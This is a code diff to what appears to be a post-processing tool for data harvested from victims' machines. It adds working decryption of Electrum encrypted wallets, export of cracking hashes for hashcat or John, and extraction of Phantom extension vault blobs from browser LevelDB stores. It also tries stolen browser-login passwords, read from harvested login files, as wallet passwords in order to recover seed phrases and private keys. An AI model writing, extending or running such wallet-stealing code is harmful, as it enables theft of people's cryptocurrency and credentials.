@@ -37,6 +37,7 @@ import zipfile
 import zlib
 from pathlib import Path
 
+from cryptography.hazmat.primitives.asymmetric import ec
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
 
@@ -1042,17 +1043,86 @@ def dump_exodus(harvest, out, keyring, system_keys, show):
             skipped("exodus: storage.seco uses another password")
 
 
-def dump_electrum(harvest, out, password, show):
+SECP256K1_ORDER = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
+
+
+def electrum_password_key(password):
+    secret = hashlib.pbkdf2_hmac("sha512", password.encode(), b"", 1024)
+    scalar = int.from_bytes(secret, "big") % SECP256K1_ORDER or 1
+    return ec.derive_private_key(scalar, ec.SECP256K1())
+
+
+def electrum_unwrap(blob, password):
+    """Electrum 2.8+ BIE1: PBKDF2-SHA512 -> secp256k1 ECIES -> AES-128-CBC -> zlib JSON."""
+    raw = base64.b64decode(blob, validate=True)
+    if raw[:4] != b"BIE1" or len(raw) < 85:
+        raise ValueError("not an Electrum BIE1 container")
+    private = electrum_password_key(password)
+    ephemeral = ec.EllipticCurvePublicKey.from_encoded_point(ec.SECP256K1(), raw[4:37])
+    shared_x = private.exchange(ec.ECDH(), ephemeral)
+    ciphertext, mac = raw[37:-32], raw[-32:]
+    for prefix in (b"\x02", b"\x03"):
+        key = hashlib.sha512(prefix + shared_x).digest()
+        if hmac.compare_digest(hmac.new(key[32:], raw[:-32], hashlib.sha256).digest(), mac):
+            decryptor = Cipher(algorithms.AES(key[16:32]), modes.CBC(key[:16])).decryptor()
+            padded = decryptor.update(ciphertext) + decryptor.finalize()
+            return zlib.decompress(padded[:-padded[-1]])
+    raise ValueError("wrong Electrum password")
+
+
+def electrum_john(blob):
+    raw = base64.b64decode(blob, validate=True)
+    if raw[:4] != b"BIE1":
+        return ""
+    return "$electrum$4*%s*%s*%s" % (raw[4:37].hex(), raw[:-32].hex(), raw[-32:].hex())
+
+
+def dump_electrum(harvest, out, passwords, show):
     total = 0
-    for wallet in harvest.rel("*.json"):
-        name = wallet.name.lower()
-        if "wallet_data" not in wallet.read_text("utf-8", "replace")[:200].lower() \
-                and "electrum" not in str(wallet).lower():
+    candidates = list(harvest.rel("*.json"))
+    for path in harvest.root.rglob("*"):
+        if not path.is_file() or path.suffix == ".json" or "wallets" not in path.parts:
             continue
         try:
-            document = json.loads(wallet.read_text("utf-8", "replace"))
+            if path.open("rb").read(6) == b"QklFMQ":
+                candidates.append(path)
         except Exception:
             continue
+    for wallet in candidates:
+        try:
+            raw = wallet.read_bytes()
+        except Exception:
+            continue
+        is_bie1 = raw[:6] == b"QklFMQ"
+        if not is_bie1:
+            text = raw[:300].decode("utf-8", "replace").lower()
+            if "wallet_data" not in text and "electrum" not in str(wallet).lower():
+                continue
+        try:
+            document = {} if is_bie1 else json.loads(raw.decode("utf-8", "replace"))
+        except Exception:
+            continue
+        if is_bie1:
+            total += 1
+            name = wallet.name
+            write(out, f"wallets/electrum-{name}.enc", raw)
+            john = electrum_john(raw)
+            if john:
+                write(out, f"wallets/electrum-{name}.john", f"{name}:{john}\n")
+            if not passwords:
+                skipped(f"electrum: {name} cifrado; usa -p/--wallet-password o hashcat (wallets/electrum-{name}.john)")
+                continue
+            opened = None
+            for candidate in passwords:
+                try:
+                    opened = json.loads(electrum_unwrap(raw.decode(), candidate))
+                    break
+                except Exception:
+                    continue
+            if opened is None:
+                skipped(f"electrum: {name} ninguna contraseña candidata abrió")
+                continue
+            document = opened
         if "seed" not in document and "xprv" not in document:
             continue
         total += 1
@@ -1060,49 +1130,93 @@ def dump_electrum(harvest, out, password, show):
             fields = {k: document[k] for k in ("seed", "xprv") if k in document}
             write(out, f"wallets/electrum-{wallet.stem}.json", json.dumps(fields, indent=2) + "\n")
             harvest.counts["seeds"] += 1
-            ok(f"electrum: {wallet.name} unencrypted")
+            ok(f"electrum: {wallet.name} abierto")
             for key, value in fields.items():
                 bullet(key, clip(value, 44) if show else mask(value, 12))
             continue
-        if not password:
+        if not passwords:
             skipped(f"electrum: {wallet.name} needs a password")
             continue
-        key = hashlib.sha256(password.encode()).digest()
         fields = {}
-        for field in ("seed", "xprv"):
-            if field not in document:
-                continue
-            blob = base64.b64decode(document[field])
-            plain = unpad(cbc_decrypt(key, blob[:16], blob[16:]))
-            fields[field] = base64.b64decode(plain).decode()
+        for candidate in passwords:
+            key = hashlib.sha256(candidate.encode()).digest()
+            attempt = {}
+            for field in ("seed", "xprv"):
+                if field not in document:
+                    continue
+                try:
+                    blob = base64.b64decode(document[field])
+                    plain = unpad(cbc_decrypt(key, blob[:16], blob[16:]))
+                    attempt[field] = base64.b64decode(plain).decode()
+                except Exception:
+                    continue
+            if attempt:
+                fields = attempt
+                break
         if fields:
             write(out, f"wallets/electrum-{wallet.stem}.json", json.dumps(fields, indent=2) + "\n")
             harvest.counts["seeds"] += 1
-            ok(f"electrum: {wallet.name} opened with the password")
+            ok(f"electrum: {wallet.stem} opened with the password")
             for key, value in fields.items():
                 bullet(key, clip(value, 44) if show else mask(value, 12))
     if not total:
         skipped("electrum: no wallet json")
 
 
+
+PHANTOM_ID = "bfnaelmomeimhlpmgjnjophhpkkoljpa"
+
+
+def phantom_stores(harvest):
+    """Both layouts: extension settings copied by the collector and the wallet copy."""
+    found = [p for p in harvest.rel("Local Extension Settings/*") if p.parent.name == PHANTOM_ID]
+    found += [p for p in harvest.root.glob(f"wallets/*/{PHANTOM_ID}/*") if p.is_dir()]
+    return found
+
+
+def read_leveldb(store):
+    """plyvel when available; otherwise the pure-Python ccl reader."""
+    try:
+        import plyvel
+        db = plyvel.DB(str(store), create_if_missing=False)
+        try:
+            return dict(db)
+        finally:
+            db.close()
+    except ImportError:
+        pass
+    except Exception:
+        return None
+    try:
+        from ccl_chromium_reader.storage_formats.ccl_leveldb import RawLevelDb
+    except ImportError:
+        return "missing"
+    records = {}
+    db = RawLevelDb(store)
+    try:
+        for record in db.iterate_records_raw():
+            if record.state.name == "Deleted":
+                continue
+            previous = records.get(record.user_key)
+            if previous is None or record.seq > previous[0]:
+                records[record.user_key] = (record.seq, record.value)
+    finally:
+        db.close()
+    return {key: value for key, (_, value) in records.items()}
+
+
 def dump_phantom(harvest, out, keyring, show):
-    stores = harvest.rel("Local Extension Settings/*")
-    targets = [p for p in stores if p.parent.name == "bfnaelmomeimhlpmgjnjophhpkkoljpa"]
+    targets = phantom_stores(harvest)
     if not targets:
         skipped("phantom: no store")
         return
-    try:
-        import plyvel
-    except ImportError:
-        skipped("phantom: pip install plyvel")
-        return
     for store in targets:
-        try:
-            db = plyvel.DB(str(store), create_if_missing=False)
-            entries = dict(db)
-            db.close()
-        except Exception as exc:
-            warn("phantom: store unreadable", str(exc))
+        entries = read_leveldb(store)
+        if entries == "missing":
+            skipped("phantom: pip install plyvel o ccl_chromium_reader")
+            return
+        if not entries:
+            warn("phantom: store unreadable", str(store))
             continue
         key = None
         wrapped = entries.get(b"key")
@@ -1112,6 +1226,20 @@ def dump_phantom(harvest, out, keyring, show):
             except Exception:
                 pass
         ok("phantom: store opened", f"{len(entries)} keys")
+        encrypted = []
+        for name, value in entries.items():
+            if b"encryption.encryptionKey" in name or b"vault.seed." in name:
+                try:
+                    document = json.loads(value)
+                except Exception:
+                    continue
+                encrypted.append((name.decode("utf-8", "replace"), document))
+        for name, document in encrypted:
+            safe = name.strip(". ").replace("/", "_").replace(".", "-")
+            path = f"wallets/phantom/{store.parent.name}-{safe}.json"
+            write(out, path, json.dumps(document, indent=2) + "\n")
+        if encrypted:
+            ok("phantom: sealed blobs saved", f"{len(encrypted)}; necesita la contraseña de Phantom")
         for name in (b"vault", b"vaults"):
             if name not in entries:
                 continue
@@ -1269,7 +1397,16 @@ def main():
 
     step(3, total, "wallets")
     dump_exodus(harvest, out, user_keys, system_keys, args.show)
-    dump_electrum(harvest, out, password, args.show)
+    wallet_passwords = []
+    for value in ([password] if password else []) + list(args.wallet_password or []):
+        if value and value not in wallet_passwords:
+            wallet_passwords.append(value)
+    for file in (out / "secrets").glob("*-logins.tsv"):
+        for line in file.read_text("utf-8", "replace").splitlines():
+            parts = line.split("\t")
+            if len(parts) >= 3 and parts[2] and parts[2] not in wallet_passwords:
+                wallet_passwords.append(parts[2])
+    dump_electrum(harvest, out, wallet_passwords, args.show)
     dump_phantom(harvest, out, user_keys, args.show)
 
     step(4, total, "accounts")
@@ -1319,6 +1456,8 @@ def parse_args():
                              "derives the S-1-5-18 masterkeys")
     parser.add_argument("--system-protect",
                         help="copied S-1-5-18 Protect folder (default: inside the harvest)")
+    parser.add_argument("--wallet-password", action="append",
+                        help="contraseña de cartera (Electrum/Phantom); repetible")
     parser.add_argument("--system-userkey",
                         help="DPAPI_SYSTEM userkey from secretsdump (20 bytes hex); "
                              "opens the S-1-5-18/User masterkeys")
